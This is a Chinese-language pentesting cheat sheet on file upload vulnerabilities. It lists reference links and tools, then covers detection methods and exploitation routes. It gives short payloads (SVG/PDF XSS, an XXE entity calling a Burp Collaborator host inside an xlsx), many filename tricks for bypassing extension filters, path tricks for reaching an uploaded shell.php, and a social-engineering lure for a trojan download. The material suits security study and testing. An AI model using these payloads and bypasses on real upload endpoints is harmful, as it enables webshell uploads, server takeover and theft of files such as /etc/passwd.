# Upload

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**相关文章**
- [简单粗暴的文件上传漏洞](https://paper.seebug.org/560/)
- [BookFresh Tricky File Upload Bypass to RCE](https://secgeek.net/bookfresh-vulnerability/)
- [Upload_Attack_Framework](https://www.slideshare.net/insight-labs/upload-attack-framework)
- [关于File Upload的一些思考](https://www.freebuf.com/articles/web/223679.html)
- [Upload与WAF的那些事](https://xz.aliyun.com/t/8084)
- [web安全-文件上传利用](https://mp.weixin.qq.com/s/Q4wN01H4fh_ATUnPwng3Ag)
- [Web 安全漏洞之文件上传](https://cnodejs.org/topic/5d196c02cdb1f967c1577295)
- [文件上传绕过思路拓展](https://blog.m1kh.com/index.php/archives/621/)

**相关案例**
- [实战渗透-看我如何拿下自己学校的大屏幕(Bypass) ](https://xz.aliyun.com/t/7786) - 大量字符 bypass waf 文件上传
- [渗透测试tips：两处有趣的文件上传到getshell](https://zhuanlan.zhihu.com/p/100871520) - 多个漏洞组合利用，无视 OSS 存储 getshell
- [实战渗透-从FCkeditor敏感信息泄露到Getshell](https://www.websecuritys.cn/archives/szst-1.html) - 利用 fck 的目录遍历找到上传点,fuzz 上传点的参数进行上传
- [简单记录一次有趣的上传](https://www.t00ls.net/articles-58979.html) - bypass 反代小技巧
- [一次任意文件读取的getshell](https://www.t00ls.net/thread-59330-1-1.html) - 在函数调用获取文件的上传点,通过任意文件读找路径

**相关工具**
- [almandin/fuxploider](https://github.com/almandin/fuxploider) - File upload vulnerability scanner and exploitation tool.
- [PortSwigger/upload-scanner](https://github.com/PortSwigger/upload-scanner) - HTTP file upload scanner for Burp Proxy
- [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)
- [Rvn0xsy/zipcreater](https://github.com/Rvn0xsy/zipcreater) - 应用于跨目录的文件上传漏洞的利用，它能够快速进行压缩包生成。

**靶场**
- [upload-labs](https://github.com/c0ny1/upload-labs)
    - writeup : [upload-labs-WalkThrough](../靶场/upload-labs-WalkThrough.md)

---

# 检测方法

waf、rasp 对上传文件的检测方法有这几种
- 后缀检测(黑白名单)
- 文件内容检测
- Content-Type 检测
- 后端二次渲染(图片裁剪、图片水印)

---

# 利用方式

- 网站脚本文件

    如 asp、aspx、jsp、php 后缀的网站脚本文件，通过访问上传的 webshell 执行系统命令，获取服务器权限。

- 可造成 XSS 或跳转的钓鱼文件
    - html
    - svg
        ```html
        <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
        ```
    - pdf
        ```
        app.alert('XSS');
        ```
    - xml

- 服务器可执行文件(PE、sh) ： 配合社工手段,例如 : 最近办公内网发现大量勒索病毒,信息科紧急部署了新版杀毒引擎,请各部门人员立即下载,下载地址: www.xxx.com/upload/木马查杀工具.exe
- mp4、avi : 配合 ffmpeg 漏洞
- shtml : ssi 注入
- xlsx : XXE

    1. 创建一个 xlsx 文档，更改后缀为 zip，解压。
    2. 打开 Burp Suite Professional，单击 Burp 菜单并选择 “Burp Collaborator client” 将其打开, 复制到粘贴板。
    3. 找到 Content_Types.xml 文件，插入 xxe 代码到文件中。
        ```xml
        <!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://xxx.burpcollaborator.net"> ]>
        <x>&xxe;</x>
        ```
    4. 重新压缩为 zip 文件，更改后缀为 xlsx。上传 xlsx 文档到目标服务器，如果没有禁用外部实体，就会存在 XXE 漏洞，burp 接收到请求。

---

# Bypass

## 信息泄露

- 云平台 API key 泄露

## 解析漏洞

- IIS 解析漏洞
- Nginx 解析漏洞
- Apache 解析漏洞
- CGI 解析漏洞

## 恶意上传

- zip、mp4 占用资源
- HTML XSS

## 后缀检测

- 后缀名Fuzz
    - [AboutSecurity/Dic/Web/Upload/](https://github.com/ffffffff0x/AboutSecurity/tree/master/Dic/Web/Upload)
    - web通用
        - htm
        - html
        - shtml
    - .net
        - asa
        - asp
        - ashx
        - asmx
        - aspx
        - axd
        - cdx
        - cer
        - config
        - cshtm
        - cshtml
        - rem
        - soap
        - svc
        - shtml
        - vbhtm
        - vbhtml
    - java
        - jsp
        - jspa
        - jsps
        - jspx
        - jspf
    - php
        - php
        - php1
        - php2
        - php3
        - php4
        - php5
        - phtml
    - Misc
        - txt
        - svg
        - pdf
        - xml
        - xlsx
- 大小写(windows)
    - `xxx.pHp`、`xxx.Jsp`
- 空格绕过
    - `xxx .php`
    - `xxx.php `
- 点绕过
    - `xxx.php.`
- 换行
    - `xxx.txt%0aphp`
    - `xxx.ph\np`
- .空格. 绕过(windows)
    - `xxx.php .`
    - `xxx.php .jpg`
    - `xxx.php. .jpg`
- 特殊字符
    - `xxx.php::$DATA` (windows)
    - `xxx.php::$DATA......` (windows)
    - `xxx.php/`
    - `xxx.php?`
    - `xxx./php` (linux)
- 特殊字符+白后缀
    - `xxx.php.jpg`
    - `xxx.php_.jpg`
    - `xxx.php/1.jpg`
    - `xxx.php{}.jpg`
    - `xxx.php;jpg`
    - `xxx.php;.jpg`
    - `xxx.php;+x.jpg`
    - `xxx.php:1.jpg`
    - `xxx.php.123`
    - `xxx.jpg/.php`
    - `xxx.jpg/php`
    - `xxx.jpg/1.php`
    - `xxx.jpg{}.php`
- 双写绕过
    - `phpphp.php`
    - `php.php`
    - `xxx.pphphp`
    - `xxx.asaspxpx`
- 00 截断
    - `file.jpg%00shell.php`
    - `shell.php%00file.jpg`
    - `shell.php%00.jpg`
- .htaccess
- 中间件解析漏洞
- 参数
    - 修改 `filename="xx.php"` 为 `filename==="xxx.php"`
    - 修改 `filename="xx.php"` 为 `filename='xxx.php'`
    - 修改 `filename="xx.php"` 为 `filename=xxx.php`

---

## 文件内容检测

- 免杀
- 添加图片头
    - `GIF89a`
- 大文件
- 参数污染

---

## 恶意覆盖

- 覆盖资源文件造成全局 XSS
- 覆盖配置文件修改配置

---

## Content-Type 检测

- Content-Type Fuzz
    - [Fuzz_content-type.txt](https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/Upload/Fuzz_content-type.txt)

---

## 后端二次渲染

- 图片马

---

## 访问拦截

- 路径
    - `xxx.com/test/img/1.png/../../shell.php`
- 解析
    - `xxx.com/shell.php;/.png`

---

## 软链接

如果攻击者上传了一个软链文件，软链描述对应的是 /etc/passwd 的话，攻击者利用程序可以直接读取到服务器的关键文件内容
